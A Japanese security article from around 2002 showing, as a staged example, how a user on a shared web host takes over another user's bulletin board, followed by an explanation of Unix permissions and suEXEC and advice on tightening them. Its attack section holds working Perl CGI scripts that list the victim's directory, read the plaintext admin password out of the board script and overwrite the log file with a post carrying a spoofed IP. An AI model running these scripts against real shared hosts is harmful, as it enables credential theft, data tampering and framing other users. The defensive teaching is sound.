
x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x

--- 第２章: 内部ユーザからの掲示板改竄とその対策 ---

著者：PaiN

x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x


■0x00.) 初めに

　この記事は2001年末-2002年5月辺りの1ヶ月間、私が某所に別の名前で掲載して
いたものに手を加えたものです。もし、「あ、なんか見たことある!こいつパクッ
たな!」と思っても、それを私にメールで送る必要はありません。

　では、改めて。

  昨今の掲示板荒らし集団増加により、BBSへの攻撃が増えています。
 
　その殆どは誹謗中傷、連続投稿、XSSを利用した「ブラクラ」等ですが、希に乗
っ取られます。そう、掲示板を乗っ取られるのです。掲示板を乗っ取られた日に
は気分最悪ですね。そこで今回は荒らし対策ではなく、掲示板の乗っ取り、改竄
とその対策を実例つきで書いていきたいと思います。

　また、今回の内容は初級者、Windowsユーザ向けに書いたものですから、UNIXユ
ーザの方に対しては適切な内容ではないと思いますので御了承ください。


■0x01.) 注意

　今回の実験を実際に再現すると犯罪となる可能性がありますので、真似しない
ようにしてください。
  ただ、私は貴方の体を制御することはできません。


■0x02.) お話の設定

　この話は基本的にフィクションですが、一部名称については真のものを使って
います。

  では、今回の設定を簡単に説明します。

○登場人物1: mp123 (エムピーイチニーサン)

http://snow.prohosting.com/mp123/の管理人。
今回のターゲット。普通の人。mp3を大量に所有する。趣味はパソコン。

○登場人物2: w0tId (ワールド)

http://snow.prohosting.com/suisyaz/の管理人。
mp123の掲示板を乗っ取ろうと企む人。初心者程度のPerlとUNIXの知識がある。

○今回実験に使用したサーバ: snow.prohosting.com

　本当は最弱多ユーザを誇るisw*bにしようと思いましたが、国内は警告がくると
恐いのでプロホスティングにしました。海外ならよいわけではないですが。

○今回実験に使用した掲示板: K*NT WEB の L*GHT B*ARD v5.6 （一部伏字）

　これは、この掲示板が悪いということでは全然ありません。むしろ素晴らしい
BBSです。ですから、これを使っているユーザーが日本では一番多いと思い、この
BBSを使わせて頂きました。


■0x03.) 基礎用語とその説明


●BBS （ビービーエス）

　Web上に置かれた電子掲示板のこと。


●CGI （シージーアイ）

　Common Gateway Interfaceの略。Webのサーバサイドプログラム。
　BBSやチャット等、サーバーに設置したプログラムが「サーバー側で実行」され、
実行結果をクライアントへ返す。


●PERL （パール）

　Larry Wall氏が開発したプログラミング言語。CGIは主にPerlで書かれている。


●UNIX/Linux

　OS。WEBサーバーはUNIX、Linuxが多い。


●Permission （パーミッション）/* 最も重要 */

　UNIX/Linuxでのファイルのアクセス権利。オーナー、グループ、その他の3つの
項目ごとに読み取り、書き込み、実行の3つの権限があります。

　今回は、保護ビット、setuid/setgidビットについては説明しません。
/* 何のことか分からない場合は無視してよい */

=============================================================================
オーナー | ファイルの所有者（作成者）
-----------------------------------------------------------------------------
グループ | オーナーと同じグループに所属するユーザ（ファイルの所有gidを持つ
         | ユーザ）
-----------------------------------------------------------------------------
その他   | 上記以外のユーザ
=============================================================================

○rwxrwxrwx表記

r: 読み取り可能
w: 書き込み可能
x: 実行可能

　パーミッションは上記のrwxで表記されることがあります。

　「-rwxrwxrwx」を「-/rwx/rwx/rwx」と4つに分け、左の「-」除いて考えると、
左から「オーナー/グループ/その他」となり、この場合、全ての人に全ての権限
が与えられています。
　例えば「-rwx------」なら、オーナー以外にファイルに触れる権利がありませ
ん。

○数値で表す

　BBSを設置する際のパーミッション設定書には、「0755」「0666」などパーミッ
ションが数値で書かれています。

○計算法

　「r → 4, w → 2, x → 1」としてオーナー、グループ、その他の順に並べま
す。例えば「-rwxr-xr-x」ならば「-rwx/r-x/r-x」と、
3つに分けて「4+2+1/4+1/4+1」とし、「7/5/5」だから「755」というわけです。
(本当は8進数表記で他とかぶらないflagを使うため桁上がりしますが、分かりや
すく、このように説明しました)


■0x04.) mp123編 - BBS設置 -

　mp123君は、snow.prohosting.comのサーバにBBSを設置しようとしました。

　BBSの設置の説明書には、

>	public_html / index.html (トップページ)
>    |
>    +-- bbs / light.cgi  [755]
>         |    light2.cgi [755]
>         |    light.log  [666]
>         |    jcode.pl   [644]
>         |
>         +-- lock [777] /
>         |
>         +-- past [777] / ... 過去ログを生成する場合

とあり、また、

>	ファイル名 アクセス権  	light.cgi 755 	light2.cgi 755 	light.log 666 
>	jcode.pl 644 	lockディレクトリ 777 	pastディレクトリ 777

とあったため、その通りのパーミッションで設置しました。

　ただ、mp123君はlogファイルを初期名のままにするとlogファイルがWebから取
得され、投稿者のIPアドレスや暗号化された削除パスワードが盗まれるという知
識を持っていたため、logファイルの名前を変えています。非常にいいことですね '-)

　この説明書は別におかしいわけではありません。問題はサーバ側の設定にある
のかもしれませんね。


●現在掲示板の様子

[ URI: http://snow.prohosting.com/mp123/cgi-bin/light.cgi ]

-----
[2] 無題 投稿者：ひひひ 投稿日：2002/05/25(Sat) 16:05

　あひゃひゃひひひひひ


[1] 無題 投稿者：管理人 投稿日：2002/05/25(Sat) 14:58

　楽しい話,ごちゃごちゃ
-----


●まとめ(mp123編)

　パーミッションに関して見ていきます。

「r: 読み取り可能」、「w: 書き込み可能」、「x: 実行可能」

「light.cgi: 755」、「light.log: 666」、「ディレクトリ: 777」

　この辺りが重要です。

  「light.cgi: 755」は、「-rwxr-xr-x」ですね。全てから読みことと、実行が
可能ですが、書き込めるのはオーナーだけです。
  「light.log: 666」は「-rw-rw-rw-」で、全てから読み取り、書き込みが許可
されています。
  「ディレクトリ: 777」は、「-rwxrwxrwx」と全てに全ての権限が与えられてい
ます。

　すでに危険そうな雰囲気ですね。


■0x05.) w0tId編 - 攻撃 -

　w0tIdはmp123の掲示板を乗っ取ります。ターゲットの掲示板はsnow.prohosting.com
のサーバに置いてあります。そして、light.cgiのスクリプトには管理パスワード
が平文で書いてあります。ですから、light.cgiのソースファイルが欲しいわけで
す。
　ちなみに、w0tIdはsnow.prohosting.comのアカウント思っています。つまり、
mp123と同じコンピュータのハードディスク上にファイルを置く事ができます。さ
らにsnow.prohosting.comでは、CGIが許可されています。それはつまり、「実行
ファイルをサーバ上に勝手に置いて、それを遠隔地から実行できる」わけです（
嫌な言い方ですが）。


●light.cgiのソースファイルを見る

  まず、light.cgiの絶対パスが必要です。

　え？「http://snow.prhosting.com/mp123/cgi-bin/light.cgiだろ？」だって？
　それはWebとしての絶対パスで、ハードディスク上の絶対パスではありません。

　まず、ハードディスク上でのlight.cgiまでの絶対パスが必要です。

  そこで以下のようなプログラムを書きました。

----8<----8<----8<-- pwd.cgi --8<----8<----8<----8<
#!/usr/local/bin/perl

print "Content-Type: text/plain\x0d\x0a\x0d\x0a";
print $ENV{SCRIPT_FILENAME}."\n";

----8<----8<----8<-- cut cut--8<----8<----8<----8<-

　このスクリプトをサーバー上で実行します。これは、実行したファイルまでの
絶対パスを取得するものです。system関数でfingerコマンドを実行するか、getp
wnam関数が使えれば、すぐにユーザーのホームディレクトリが分かりますが、た
ぶん使えないと思うので確実な方法でやります。

/usr/home/web/s/suisyaz/cgi-bin/pl/pwd.cgi

  という結果でした。これを元にlight.cgiの位置を予想します。

/usr/home/web/

  まではたぶん同じです。そのあとのsはsuisyaz(ユーザー名)のsと考えます。
  そう、/usr/home/web/[A-Za-z0-9_]/があると考えます。と、すれば、

/usr/home/web/m/mp123/cgi-bin/

　というディレクトリ(フォルダ)に、light.cgiが置かれているということになり
ます。

 次に以下のようなプログラムを作りました。

----8<----8<----8<-- opendir.cgi --8<----8<----8<----8<
#!/usr/local/bin/perl

print "Content-Type: text/plain\x0d\x0a\x0d\x0a";
opendir(DIR, '/usr/home/web/m/mp123/cgi-bin/') or print $!;
print $_."\n" foreach (readdir(DIR));
closedir(DIR);

----8<----8<----8<-- cut cut cut --8<----8<----8<----8<

　このようなファイルをサーバーで実行させます。
　これは、「/usr/home/web/m/mp123/cgi-bin/」ディレクトリ内のファイルリス
トを表示させます。

-----
.
..
jcode.pl
kaiem.log
light2.cgi
light.cgi
-----

　という結果でした。ありましたね。ディレクトリが無いのでlock、pastは作っ
てないようです。位置が分かったので読んでみましょう。

----8<----8<----8<-- check.cgi --8<----8<----8<----8<
#!/usr/local/bin/perl

$file = '/usr/home/web/m/mp123/cgi-bin/light.cgi';

print "Content-Type: text/plain\x0d\x0a\x0d\x0a";
print 'r' if (-r $file);
print 'w' if (-w $file);
print "\n";

----8<----8<----8<--  cut  cut  --8<----8<----8<----8<

　その前に、一応チェックしてみました。これはファイルが読めるなら'r'、ファ
イルへ書き込めるなら'w'を表示するものです。

r

  と出ました。このファイルは読み込めます。読みましょう。

----8<----8<----8<-- read.cgi --8<----8<----8<----8<
#!/usr/local/bin/perl

$file = '/usr/home/web/m/mp123/cgi-bin/ligth.cgi';

print "Content-Type: text/plain\x0d\x0a\x0d\x0a";

open(FILE, $file);
print while (<FILE>);
close(FILE);

----8<----8<----8<-- cut - cut --8<----8<----8<----8<

  これは$fileに指定したファイルの内容を全て表示させるものです。

  以下は結果。

-----
#!/usr/local/bin/perl



#?!??????????????????????????????????????????????????????????????????

#?  LI*HT B*ARD v5.6 (2002/01/06) (伏字)

#?  Copyright(c) K*NT W*B 2002 (伏字)

#?  E-MAIL: ******************(伏字)

#?  WWW: ****************(伏字)

#????????????????????????????????????????????????????????????????????

（長いので略）

# ?C???O?p?}?X?^?p?X???[?h(”??p‰p?”??)

$pass = 'sjeis';

（以下略）
-----

　文字化けしましたが読めました。w0tIdはmp123と同じグループのユーザーです。
ですから、755とグループからの読み込み許可が出ているので読めて当然です。
  管理パスワードは sjeis ですね。取りあえず掲示板の管理人室へ入れるように
なりました（他人のパスワードを不正に使用したら犯罪です）。

  もう少し試してみましょう。


●logファイル改竄

  BBSのlogファイルを改竄してみましょう。
  logファイルとは、掲示板に書き込んだ内容が保存されているファイルです。

　BBSから書き込むのではなくて、自分のホームディレクトリに置いたスクリプト
から、logファイルに直接書き込みます。
  logファイルの位置は、

/usr/home/web/m/mp123/cgi-bin/kaiem.log

  でしたね。書き込めるかチェックしてみましょう。

----8<----8<----8<-- check.cgi --8<----8<----8<----8<
#!/usr/local/bin/perl

$file = '/usr/home/web/m/mp123/cgi-bin/light.cgi';

print "Content-Type: text/plain\x0d\x0a\x0d\x0a";
print 'r' if (-r $file);
print 'w' if (-w $file);
print "\n";

----8<----8<----8<--  cut  cut  --8<----8<----8<----8<

  さっきlight.cgiの読み取りチェックしたもの同じです。

rw

  と出ました。書き込みできるそうです。

　書き込む前に投稿記事のフォーマットが知りたいので、一度kaiem.logを読み取
ってみます。

----8<----8<----8<-- read.cgi --8<----8<----8<----8<
#!/usr/local/bin/perl

$file = '/usr/home/web/m/mp123/cgi-bin/kaiem.log';

print "Content-Type: text/plain\x0d\x0a\x0d\x0a";

open(FILE, $file);
print while (<FILE>);
close(FILE);

----8<----8<----8<-- cut - cut --8<----8<----8<----8<

  light.cgiを読み込んだのと同じものです。

  以下は結果。

-----
LIGHT<>Light Board<>008080<>6<>ＭＳ 
Ｐゴシック<><>F5F5F5<>000000<>0000FF<>800080<>FF0000<>../index.html<>100<>green<>blue<><><>
2<>2002/05/25(Sat) 
16:05<>ひひひ<><>無題<>あひゃひゃひひひひひ<><>168.143.113.102<><>
1<>2002/05/25(Sat) 14:58<>管理人<><>無題<>楽しい話<><>168.143.113.109<><>
-----

  読めましたね。フォーマットは、

-----
投稿番号<>投稿日<>名前<>??<>題名<>本文<>??<>投稿者のIPアドレス<>??<>
-----

なので、

-----
3<>6969/69/69(x0x) 69:69<>w0tId<><>Crack.<>Haa..Haa..<><>696.969.696.969<><>
-----

　と、こんな感じの記事を追加しましょう。
　よく見ると、BBSのタイトルや色の設定などもファイルにありますから、掲示板
の設定も変更可能ですね :-)

  では、実際に以下のようなスクリプトで書き込んで見ましょう。

----8<----8<----8<-- write.cgi --8<----8<----8<----8<
#!/usr/local/bin/perl

$file = '/usr/home/web/m/mp123/cgi-bin/kaiem.log';

open(FILE, ">$file");
print FILE <<____EOT;
LIGHT<>Light Board<>008080<>6<>ＭＳ 
Ｐゴシック<><>F5F5F5<>000000<>0000FF<>800080<>FF0000<>../index.html<>100<>green<>blue<><><>
3<>6969/69/69(x0x) 69:69<>w0tId<><>Crack.<>Haa..Haa..<><>696.969.696.969<><>
2<>2002/05/25(Sat) 
16:05<>ひひひ<><>無題<>あひゃひゃひひひひひ<><>168.143.113.102<><>
1<>2002/05/25(Sat) 14:58<>管理人<><>無題<>楽しい話<><>168.143.113.109<><>
____EOT
;
close(FILE);

print "Content-Type: text/plain\x0d\x0a\x0d\x0a";
print "write\n";

----8<----8<----8<-- cut - cut --8<----8<----8<----8<

　これは完全なログファイルの置き換えです。この方法だと完璧なIPアドレスの
偽装ができるので、仲間内の犯行に見せかけることもできますね。
　多分書けていますので、掲示板を見に行って見ましょう。

●mp123の掲示板

-----
[3] Crack. 投稿者：w0tId 投稿日：6969/69/69(x0x) 69:69

Haa..Haa..

--------------------------------------------------------------------------------
[2] 無題 投稿者：ひひひ 投稿日：2002/05/25(Sat) 16:05

あひゃひゃひひひひひ


--------------------------------------------------------------------------------
[1] 無題 投稿者：管理人 投稿日：2002/05/25(Sat) 14:58

楽しい話,ごちゃごちゃ

-----

  きちんと書き込めていますね。成功です。
  確認のため、手に入れたパスワードを使い、管理人室に入ってみましょう。
（他人のパスワードを使ったら犯罪です）


●管理モード

-----
　編集する記事をチェックして編集ボタンを押して下さい。

CHK 投稿日 題名 なまえ メール コメント
3 6969/69/69(BOM) 69:69 Cracked. HeII0  Haa..Haa.. [696.969.696.969]
2 2002/05/25(Sat) 16:05 無題 ひひひ  あひゃひゃひひひひひ [168.143.113.102]
1 2002/05/25(Sat) 14:58 無題 管理人  楽しい話 [168.143.113.109]
-----

  きちんとIPアドレスも偽装できてますね。

  おしまい。


■0x06.) CGI実行の考え方と改竄対策方法

  なぜこのようなことになったのか考えてみましょう。
　理由は簡単、設置の時点で設置者が改竄できるような設定をしているのです。
では、どう設定するのが好ましいのか？これには、UNIXやCGIの基礎的な知識が必
要です。
　「んなもんいらんから、はよ教えろ！！」という方は[0x07]へ進んで下さい。
「なんか、この下にやけに書き込んでいるが暇だから見てやろう」と思う方は以
下の長文を読んでくださいませ。


●なぜCGI製作者は実行ファイルを755、ログファイルを666と書くのか？

　これは彼らの正しい判断で、彼らが間違っているわけではありません。サーバ
によってはグループからのアクセス権を消すと、CGIが動作しなくなることがあり
ます。そこで、「確実」に動作するように755、666等とパーミッション設定書に
書いているのです。

　では、どこでそれを判断するのでしょうか。この話を進める上で重要なキーワ
ードとなるのが、「ユーザ権限とプロセス」「suEXEC」です。


●ユーザ権限とプロセス

　マルチユーザOSとして開発されたUNIX/LINUXは、Windows98には無い(薄い？)ユ
ーザ間のセキュリティが意識されています。例えばAとB、二人のユーザがいたと
し、Xというプログラムがあったとします。AがXを実行した場合「XはAの権限で動
作」し、BがXを実行した場合「XはBの権限で動作」します。そして、その先には
パーミッションというフィルターがあるためAとBの間のプライバシーを守ること
ができます。

　ここで「CGIは誰が実行しているの？」という疑問が出てきます。答えは簡単、
Webサーバが実行しています。さらに、「Webサーバは誰が実行したの？誰の権限
で動いているの？」という疑問も出てきます。通常Webサーバは専用ユーザを作成
し、その権限で動かします。少し古い時代だと「nobody」というユーザで動かす
のが一般的でしたが、最近では「nobodyがファイルを所有すべきでない」という
考えがあるため、Webサーバ専用のユーザ、例えば「web」や「apache」なんてユ
ーザを作成し、その権限で動かしています。

　さて、ここでセキュリティー上の問題が出てきたことにお気づきでしょうか。
同じサーバの全てのCGIは、Webサーバを実行した権限で動くため、ある1つのCGI
から書き込めるファイルは、他のCGIからでも書き込むことが可能になってしまい
ます。これでは、Aが日記を付けるために作ったCGIの生成したデータをBに書き換
えられる可能性が出てきます。この問題を回避するために有名なWebサーバソフト
「Apache」では、「suEXEC」という仕組みが準備されています。

●suEXEC

  suEXECとは、私の勝手な予想だと「switch user execute」です。つまりユーザ
を切替えて実行するということです。

　UNIXにはsetuid/setgidという概念があります。これは前述したパーミッション
により設定することができます。setuidとは特定のプログラムに特定のユーザID
を対応づけることで、どのユーザが実行しても設定されたユーザの権限で動くよ
うにする仕組みです。例えば、ユーザAがプログラムXをsetuidしたとすると、Bが
Xを実行した場合でも「XはAの権限で動作」するようになります。このようなset
uidされたプログラムを「setuidプログラム」や「suidプログラム」なんて呼んだ
りします。有名なsetuidプログラムには「pingコマンド」があり、これはpingコ
マンドがrootしか使用することのできないRAW_SOCKET（低レベルソケット）を使
用しているため、それを一般ユーザが使用することができません。この問題を回
避するためにpingコマンドを「rootにsetuid」し、pingコマンドを誰が実行して
もroot権限で動作するようにしています。

　さて、話を戻します。もう分かったと思いますが、suEXECとはCGIを「そのCGI
の所有者の権限で動かす」仕組みです。これにより、Aが設置したCGIはAの権限で
動き、Bが設置したCGIはBの権限で動くため、AはCGIが書き込むログファイルのパ
ーミッションを適切に設定しておけば、Bが設置したCGIに書き換えられる問題が
無くなります。これで全ての問題は解決されたと思われるかもしれませんが、も
しもAが設置したCGIにセキュリティーホールが存在すると、それを利用してAの権
限が奪われる可能性もあるため、一概にsuEXECが優れているとは言えません。

　一応、上記の説明で満足できない方のためにsuEXECの仕組みを説明しておきま
す。suEXEC環境に設定されたApacheはCGIを「suexecというWrapperプログラム」
を通して実行します。実は、このsuexecというプログラムがrootにsetuidされて
います。Apacheから呼び出されたsuexecは、自分を呼び出したのは正当なユーザ
か？実行対象のファイルは実行して問題ないか？等をチェックした後に、実行対
象のCGIと同じユーザ、同じグループの権限に化け（ここにrootが必要）CGIを実
行することで、CGIをその所有者の権限で動かせるようになっています。

　長くなりましたが、言いたいことはサーバの環境によって適切な設定が違うと
いうことです。例えば、suEXECな環境であれば、実行ファイルは700、書き込む必
要のあるファイルは600で正常に動作させることができますが、そうでない場合は
CGIが動作する権限がアクセスできるようにしておかないと動作しません。そして、
完全にWebサーバの権限でCGIが動作しているサーバでは、どう設定しても「ログ
ファイルの位置が分かれば」書き換えることが可能です。


●suEXEC環境でないサーバ

「どーせ無料サーバは全てsuEXECってやつだろ？」

  と思うかも知れませんが、そんなことはありません。
　自分の経験からするとsuEXECな無料サーバスペースは全体の半分くらいです。
しかし、だからといって余裕で誰もが他人のファイルを書き換えれるようにはな
っていません。サーバ側なりにいくつかの方法でセキュリティーを考慮していま
す。

  例を以下に列挙してみます。

1. 各ユーザのホームディレクトリの位置が分からないようにする
2. サーバ内ディレクトリのファイルリストを取得できないようにする
3. Perlで特定の関数以外を使えないようにする

　どれも、完全な対策ではありません。

　1は、特徴のあるファイル名をキーワードに全ディレクトリを検索すればターゲ
ットを見つけることができるかも知れませんし、2、3は環境変数SCRIPT_FILENAME
とCGIのURIから、ターゲットの位置が予想できる場合があるからです。しかし、
これらがいくつか組み合わせてあったり、SCRIPT_FILENAMEが取得でない場合は、
ある程度のセキュリティーが確保されていると言えるでしょう。

  ただ、これらの対策方法は正当なユーザの自由すら奪います。


●対策ヒント

　Webサーバの権限でCGIが動作している場合でも、telnetまたはsshでログインで
きるならば、CGIをsetuidしておくと、自分の権限で動かせる可能性があります。
  ただ、telnetやsshを開放しているサーバは少ないでしょう。


■0x07.) よく意味が分からないがパーミッションの設定を厳しくしたい

  それは非常に簡単です。

実行ファイル(CGI)    : 755 → 705 → 701 → 700
書き込むファイル     : 666 → 606 → 600
読み出すファイル     : 444 → 404 → 400
ディレクトリ         : 755 → 705 → 701
書き込むディレクトリ : 777 → 707 → 700

  と、順に試していき正常に動作しているならば、700、600、701が最適です。
　705や606等とグループからのアクセスを拒否できれば、同じグループの別ユー
ザからの攻撃を防ぐことができます。
　755や666でないと正常に動作しない場合は、攻撃されないことを祈るか、別の
サーバを使いましょう。

　また、サーバの案内ページやFAQに適切な値が書いてあるところもあります。


■0x08.) 関連する問題

　今回の内容を初めて読んで余裕で分かった人のためにいくつか面白い（？）問
題を出してみます。
　解答はありませんで、気になるものがあれば自分で考えてみてください。

1. WindowsサーバのCGIってなんて権限で動いてるの？suEXECなんてあるの？
2. mod_phpから実行されたPHPってApacheが内部で実行しているらしいけど、どう
よ？
3. Apacheを実行している権限でCGIが動くのなら、CGIからApacheを停止できる？
4. CGIからsetuidすればCGIを実行した権限を持つsuidプログラムが作成できる？
5. 書き込み可能な他人のディレクトリに勝手にCGIを設置できる？


■0x08.) 最後に

　今回[0x05]では、いろいろと面倒な作業をしてきましたが、世の中にはとても
楽に簡単に初心者でも[0x05]のようなことが実行できるCGIがいくつか配布されて
います。例えば、Alice P Liddel氏の「Perl Duke Explorer（PDE）」は掲示板荒
しには有名ですし、他人のディレクトリへのファイルアップロード機能の付いた
「Perl Duke Uploader（PDU）」、コマンドラインに慣れている人向けの「telnet
.cgi」や私が書いたNRSC等のようにリモートログインしたようにCGIからサーバ内
を探索できるものも存在します。そして、実際にそのこと知っている人も沢山い
ます。そのような人達に狙われたときのためにパーミッションのことを少しだけ
分かってほしくて、今回の記事を書きました。
　自分でCGIを設置すると、管理者は「CGI選び」「設定/設置」「運営」と多くの
場面でセキュリティーについて考えなければなりません。
　安全で快適なコミュニティーを目指してがんばってください '-)

（無理だと思ったら信用のできるレンタル掲示板でも使いましょう）

